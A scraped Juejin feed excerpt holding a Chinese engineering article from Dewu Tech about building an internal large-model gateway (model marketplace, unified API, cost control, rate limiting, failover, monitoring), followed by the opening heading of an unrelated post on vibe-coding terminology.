SANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、导语</h2>
<p>在人工智能技术快速演进的时代，大型语言模型和AI智能体已成为各类应用的核心组件，引发AI相关API流量的指数级增长。而大模型网关，正是这场变革中应运而生的智能交通枢纽。</p>
<p>随着DeepSeek、Qwen等开源模型及各类商用大模型的普及，企业AI应用场景日益丰富，从智能客服自动化到代码生成与软件开发，从金融法律分析到内容生成引擎，AI正深度融入企业核心业务流程。</p>
<p>这种深度融合使得企业不仅使用SaaS化的LLM服务，更在私有化环境中微调、部署LLM模型，形成混合云架构，随之带来了多LLM适配管理、成本失控、数据安全和可靠性保障等系列挑战。</p>
<h2 data-id="heading-1">二、大模型网关：AI流量的智能调度中心</h2>
<p>大模型网关是为AI工作负载专门设计的网关解决方案。它作为连接业务与AI基础设施的统一端点，为应用程序和模型之间的AI流量提供全面的管控能力。</p>
<p>与传统API网关不同，大模型网关针对AI请求的特有模式进行了专门优化。传统API网关专注于通用数据流量，基于RESTful API和静态请求响应设计，而大模型网关则专门应对AI工作负载的特殊需求，比如，长时与流式响应、复杂输入输出、高资源消耗与批处理、上下文与状态管理、专属监控与计量、关注成本与业务效果，等等。</p>
<p>大模型网关的核心能力主要体现在几个维度：模型市场、模型体验、模型调度、模型成本和稳定性（可观测性、容量管理、模型流控、服务告警）。</p>
<p>其中稳定性是大模型网关的“压舱石”，确保服务高可用、可管理、可追溯。容量管理可根据业务流量预估预先配置好足够的模型TPM额度，避免突发流量导致服务不可用或影响别的业务使用。模型观测提供实时监控每个模型健康状态、响应延迟、成功率等关键指标。模型流控可做到Key和模型粒度的TPM、QPS流量控制，一旦业务请求突破限流阈值，将依据流控规则进行限流。服务告警能力目标是借助Flink实时计算能力提供用户分钟级别的模型服务异常实时告警能力。</p>
<h2 data-id="heading-2">三、自建缘由：得物AI部署的四大挑战</h2>
<p>随着AI在得物的应用场景不断深入，其帮助公司提升效率和降低成本的潜力被广泛挖掘。然而，我们在这一过程中面临一系列严峻挑战。</p>
<h3 data-id="heading-3">避免资源浪费并提升效率</h3>
<p>在实际场景中，得物需要同时使用很多个AI模型，包括开源模型、商用模型及自建模型，这些模型的API接口、数据格式和调用方式各异。</p>
<p>如果每个业务域单独建设接入能力，会导致技术栈碎片化和重复开发，形成一个个“烟囱”，造成公司资源浪费。另外，如果每个开发团队都需要直接与各种AI模型的API对接，开发者必须学习每个AI API和AI平台，实现供应商特定的代码，会显著降低开发效率。</p>
<h3 data-id="heading-4">保障内外部模型成本可控</h3>
<p>据估算，得物12月份调用大模型的Token消耗量已达数千亿规模，是1月份用量的20.63倍，仅Token调用单月成本就是一笔相当大的金额。若业务各自直接对接公有云模型服务，可能导致模型使用和成本失控。因此，必须依托大模型流量统一入口建设一套完整的成本管控体系。</p>
<h3 data-id="heading-5">保障接入外部模型数据安全</h3>
<p>将敏感信息传输到外部LLM提供商引发了关于数据隐私、法规合规性（如PIPL和GDPR）以及潜在数据泄露的担忧。为了保障数据安全，我们考虑自建。</p>
<h3 data-id="heading-6">保障模型服务运行稳定可靠</h3>
<p>模型网关需解决以下核心稳定性问题：</p>
<ul>
<li>延迟与成功率波动：模型服务受底层算力限制，普遍存在低限流阈值，且响应延迟与调用成功率波动显著大于传统API。</li>
<li>基于Key的容量管理：模型服务通常设置固定限流阈值，易导致不同业务场景间流量相互挤占，影响全局可用性。</li>
<li>实时告警与可观测性：需在服务异常或触发限流时第一时间告警，同时完整记录请求日志（含Prompt及来源IP），便于问题追踪。</li>
<li>基于Token的精准限流：应建立以Token数量（而非调用次数）为基准的配额管理机制，从根源防止资源滥用，保障业务平稳运行。</li>
</ul>
<h2 data-id="heading-7">四、行业实践：大模型网关的多元解决方案</h2>
<p>大模型网关作为大模型应用的关键中间层，近年来随着企业级AI应用部署的加速而快速发展，以实现AI能力的统一、高效、可控管理。</p>
<p>目前市场上有多种大模型网关解决方案，它们在商业模式和核心能力上都各有特色。这里笔者将各类网关产品进行了梳理与汇总，以便读者大致了解行业现状。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/718ac135c5f24891bf254c8d896d3d7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=K8%2FHNjtG8Uw0zrA1n8YYKdcx7zA%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">AI网关主要参与者及产品</p>
<h2 data-id="heading-8">五、实施策略：构建企业大模型网关的六步法</h2>
<p>对比行业落地大模型网关的案例，针对得物实际业务情况，在内部落地大模型网关时，我们制定了六个方面的策略。</p>
<h3 data-id="heading-9">打造信息丰富的模型市场</h3>
<p>随着大模型在得物内的广泛深入应用，从B/C端创新到后端效能提升，场景愈发丰富复杂。加之自研/自部署（如 Qwen、DeepSeek）与内外厂商模型层出不穷，模型供给呈现分散与混乱，业务选型门槛抬高，往往从调研、验证到上线需耗时1~2天，极大增加了业务接入AI的难度。</p>
<p>为此，网关对接入模型进行统一梳理，打造信息完备的“模型市场”。本质上是一个“AI 模型应用商店”，将分散混乱、高门槛的选型流程，重构为集中、透明、可量化评估的标准化路径。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/712479495a5141628d0d3a359027c174~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=d5QPcxxiBBhwYZja8YFQFWZ0nIM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">大模型市场</p>
<p>通过统一模型市场，网关构建覆盖发现、评测、验证与集成的完整闭环：</p>
<ul>
<li>模型纳管：集中管理来自自研与内外部厂商的多样化模型，形成内部“模型货架”，消除信息碎片；原生支持托管与上云对接。</li>
<li>评测对比：支持文本生成、图像理解/生成等对比测试，可将真实业务问题一键投递给多模型直观比拼，显著降低试用门槛。</li>
<li>一站式接入：选定模型后即可查看 API 接入指南，完成“选型-试用-接入”的闭环，大幅提升对接效率。</li>
<li>运营与推荐：提供模型推荐能力，按效果与性价比打标、置顶，缩短选型时间并助力降本。</li>
</ul>
<p>通过建设模型市场，实现了模型接入的统一化与标准化，模型上架和接入效率显著提升。<strong>模型上架时间从1~2天降低到 10 分钟内，试用从 1 天降低到 5 分钟以内。</strong></p>
<h3 data-id="heading-10">统一各业务模型服务入口</h3>
<p>通过建设OpenAI like风格的统一访问API和模型服务调度能力，网关将绝大部分AI模型服务的访问集中到单一入口，使不同业务线无需关注后端模型的具体实现细节，也能实现不同厂商模型服务之间的容灾。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2aaa017b31c47bbb7a5d05aa4aa5c9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=uBNyjZ7QgxhFMDsyEC%2BT0BXS%2Fkw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46352cca9e0b4f23933ba1ba58c7130b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=t5ei8Jbu29LfFXrk3z13jlxSljs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">模型调度策略与OpenAI like风格API</p>
<h3 data-id="heading-11">建设全流程成本管控体系</h3>
<p>在成本治理和优化上，围绕“源头管控、成本感知、模型调度、厂商折扣和成本监控”等方面着手闭环能力搭建。打通了从预算申请、模型选型、接入调用，到运行观测、成本结算的全链路，实现了精准的成本治理与优化。</p>
<p>具体表现为，在3、4季度token用量分别较前一季度增长2.52倍和2.16倍的情况下，每百万Token的成本分别降低50%+和45%+，降本额度也相当可观，达到数百万元，在保证业务体验的前提下有效压降了模型使用成本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e024221ae7284fc1bcdf04f1b97ee8a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=xs7Jdtk39nG6s0GxwFSLXl9p4ss%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">总体降本思路&amp;策略</p>
<p>目前正在搭建精细化降本能力，其核心思路是：通过构建Key/模型/厂商/项目维度的成本大盘、构建各外部厂商各类别模型均价大盘（发现更有性价比的模型）、建设用量和成本每周主动推送机制、完善成本预警/告警体系等措施，促使业务依据成本和价格数据主动进行成本治理。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df77e202aad547928d170a18444694b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=CkkxZLmOVbuESvidWE8GpRN7C%2B4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">全流程降本能力体系</p>
<h3 data-id="heading-12">持续夯实稳定性架构能力</h3>
<p>在架构能力建设上，围绕“高可用、可控成本、稳定体验”三大目标，重点建设了限流、调度和容灾三类核心架构能力，<strong>可实现分钟级容灾切换，为大规模、多模型、多业务场景下的稳定运行提供基础保障。</strong></p>
<ul>
<li>容量管理与限流</li>
</ul>
<p>通过建设模型容量的配置化管理机制，实现按Key/项目等维度的TPM容量管理体系；若业务流量（token）超过阈值，便触发限流及容量告警。</p>
<ul>
<li>模型调度与容灾</li>
</ul>
<p>模型调度能力可帮助我们实现厂商间模型粒度的分钟级容灾。具体做法是：若检测到当前API Key配置有模型调度策略，则模型调度器便将请求按配置规则执行调度，并将选中的模型交付给模型路由模块，由路由模块封装后将请求转发到对应厂商的模型服务实现。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25d6f3425fef4d3594c8f6ebeb99ddf7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=PrMA4gmjf9aaVJUDPIG4iNSa9QE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p align="center">模型调度与路由</p>
<h3 data-id="heading-13">建设分钟级实时观测能力</h3>
<p>在AI规模化应用时代，没有分钟级观测体系的模型网关，就像没有仪表盘和刹车的F1赛车——速度越快，风险越大，毁灭性越强。因此，<strong>必须建设完善的模型调用/用量/成本的分钟级观测（监控+告警）体系。</strong></p>
<ul>
<li>模型调用/用量/性能观测。目前已实现Key和模型粒度的模型调用、token用量的监控大盘，如下图所示：</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f608d5546dd460491aec848a8183cfd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=OovANBkw%2FrAxcOI1U1FMnkjgRpI%3D" alt="" loading="lazy"/>调用/用量监控分时（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b34d44c641143f995ab93633447bae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=67yi06G4uhuSGCTjHMzzh2Ef9fk%3D" alt="" loading="lazy"/>调用失败率和平均RT（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d4c2e36231148dbb9e749316f14b762~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=3Wb37wBHW%2FlxSbWxuzj7%2Fh5no3A%3D" alt="" loading="lazy"/>RPM/TPM监控分时（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/385fdaaa94ea464eb36dfb8ecbe93e1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=R3JGg7OOR5%2F3ah4uXHdEFfmpXcg%3D" alt="" loading="lazy"/>端到端平均RT监控分时（基于Key）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2df772dd4ea45d8be51b8a12662aba3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=xkOPAbNvvuhz4P54AxxPaIoMAxA%3D" alt="" loading="lazy"/>用量监控分时（基于模型）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18afbad886d047a58aec8c8c7cd4890b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704322&amp;x-signature=stdG8wPPI10YrPLDMC8xBOvjYCM%3D" alt="" loading="lazy"/>性能监控分时（基于模型）<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li>模型成本观测。模型成本观测方面，正在实现模型、Key、厂商、项目等粒度的实时监控大盘，以及日/周/月/指定时间维度汇总的成本数据大盘。</li>
</ul>

<ul>
<li>模型异常告警。模型服务告警方面，当前正在基于Flink实施计算和Kafka事件订阅机制建设一套基于模型和Key的实时告警体系，让业务对自己的模型调用异常能在3分钟以内通过飞书告警感知。</li>
</ul>
<h3 data-id="heading-14">建设Key生命周期管理能力</h3>
<p>通过API Key管理产品化能力建设，实现了API Key申请工单及自动分发、Key场景/负责人/共享人/状态管理和黑名单功能，并依托API Key实现接口鉴权、预算管理（预算分配/预算消耗/预算预警）、容量管理、模型调度等核心功能及关键流程节点的规范化管理。</p>
<h2 data-id="heading-15">六、创新亮点：大模型网关的核心技术突破</h2>
<p>模型网关瞄准“效率-成本-稳定性-安全&amp;合规”着力平台建设，并继续在成本管控、模型接入效率、服务稳定性、模型监控/告警等方面持续创新：</p>
<ul>
<li><strong>构建全流程成本管控体系。</strong> 通过预算与 API Key 申请自动化、用量监控、成本展示、超额预警与告警、智能调度、用量与成本大盘等能力，形成“预算申请—调用监控—预算预警—模型调度—费用查看”的闭环管控。</li>
</ul>

<ul>
<li><strong>实现跨厂商的模型级容灾。</strong> 通过在网关配置显式或默认的调度策略，将请求优先分配至性价比更高的模型，既实现不同厂商间的模型级容灾，也成为降本利器。</li>
</ul>

<ul>
<li><strong>实现厂商无感的接入体验。</strong> 网关统一分发 API Key 并提供统一的模型服务 API，业务无需关心各厂商的入参/出参差异，即可获得一致的接入体验并显著提升效率。</li>
</ul>

<ul>
<li><strong>便捷高效的模型选型体验。</strong> 依托模型市场、试用预算池、试用与效果对比、推荐板块等功能，在控成本前提下为用户提供快捷选型路径，助力在层出不穷的模型中快速锁定理想方案。</li>
</ul>

<ul>
<li><strong>分钟级用量与成本观测。</strong> 已构建近实时（分钟级）运行监控，覆盖调用量、失败次数/率、RT、TPM、RPM等关键指标；并在开发基于 Key 与模型粒度的成本实时观测与离线报表，支持按周将成本汇总推送给调用方。</li>
</ul>
<h2 data-id="heading-16">七、应用收益：从成本节约到效能提升</h2>
<p>得物部署大模型网关后，经过「模型网关升级」项目建设，取得如下效果：</p>
<p><strong>(1) 网关平台从0~1搭建起来。</strong> 模型网关从单一的纯后台服务进化为面向管理员和研发/产品/运营用户的平台化产品；不再只是模型访问的“管道”，而是集模型集市、模型调度、成本治理、创新实验于一体的支撑整个组织进行AI创新的入口平台。</p>
<p><strong>(2) 内外部模型100%纳管。</strong> 从0~1建成对接得物（KubeAI）百度/阿里/字节/华为/微软/谷歌模型服务的模型集市，完成内外部模型100%纳管，新模型上架/接入只需在平台一键配置，无需新写实现逻辑。</p>
<p><strong>(3) 模型接入效率提升97%。</strong> 管理各云商和自建模型140个，单模型平均上架时间从1~2天降低到 10 分钟内，接入效率提升97+%；模型试用与效果评估过程从 1 天降低到 5 分钟以内，效率提升98%+。</p>
<p><strong>(4) H2节省成本数百万元。</strong> 依托模型调度切换能力和统一API建设，以及降本方法论推广，Q3、Q4在用量均较前一季度翻倍的情况下，实现每百万token成本连续分别降低51.52%和48.37%。两季共实现降本额度达数百万元，并且随着用量增加降本收益将越来越明显。</p>
<h2 data-id="heading-17">八、未来展望：从大模型网关向AI网关演进</h2>
<p>大模型网关的未来发展将向如下几个方向演进：</p>
<p>首先，模型网关继续承担大模型成本管控主体责任，继续通过强化数据分析能力推进精细化降本，落地Qwen系列自建模型通过云商托管方式降本。</p>
<p>其次，围绕标准化与生态兼容，网关将引入并适配 MCP（模型上下文协议）；实现API同时兼容多厂商与多形态模型（文本、图像、语音、视频与多模态），在保持一致体验的前提下实现跨生态的无缝互通与扩展。</p>
<p>另外，API网关正从单纯的流量管理工具转变为AI编排平台，将在已有的模型调度能力基础上建设更强大的工作流与多模型协同机制，能根据成本、延迟、准确性，将请求分配给最优AI模型。</p>
<p>最终，模型网关将不再是一个“网关”，而是企业智能化的“神经中枢”——它不直接思考，但确保思考过程高效、安全、经济地发生。</p>
<p>结语：</p>
<p>未来的技术方向已经清晰——大模型网关不是API网关的替代品，而是其演进形态。随着AI逐步嵌入各类应用，企业选择可扩展的大模型网关平台，将避免被孤立在特定AI生态中，获得技术架构的长期竞争优势。</p>
<h3 data-id="heading-18">往期回顾</h3>
<p>1.从“人治”到“机治”：得物离线数仓发布流水线质量门禁实践</p>
<p>2.AI编程实践：从Claude Code实践到团队协作的优化思考｜得物技术</p>
<p>3.入选AAAI-PerFM｜得物社区推荐之基于大语言模型的新颖性推荐算法</p>
<p>4.Galaxy比数平台功能介绍及实现原理｜得物技术</p>
<p>5.得物App智能巡检技术的探索与实践</p>
<h3 data-id="heading-19">文 /禹极</h3>
<p>关注得物技术，每周更新技术干货</p>
<p>要是觉得文章对你有帮助的话，欢迎评论转发点赞～</p>
<p>未经得物技术许可严禁转载，否则依法追究法律责任。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding 概念大全]]></title>    <link>https://juejin.cn/post/7602191709389176874</link>    <guid>https://juejin.cn/post/7602191709389176874</guid>    <pubDate>2026-02-03T06:28:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602191709389176874" data-draft-id="7602211941513183286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding 概念大全"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-03T06:28:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="金金金__"/> <meta itemprop="url" content="https://juejin.cn/user/1979586945487064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding 概念大全
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1979586945487064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    金金金__
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:28:39.000Z" title="Tue Feb 03 2026 06:28:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读31分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vibe Coding 概念大全</h2>
<blockquote>
<ul>
<li>本文内容基于公开资料整理与个人实践总结，力求用清晰易懂的方式，带你一文掌握 AI 编程的核心术语</li>
</ul>
</blockquote>
<h3 data-id="heading-1">AI 基础概念</h3>
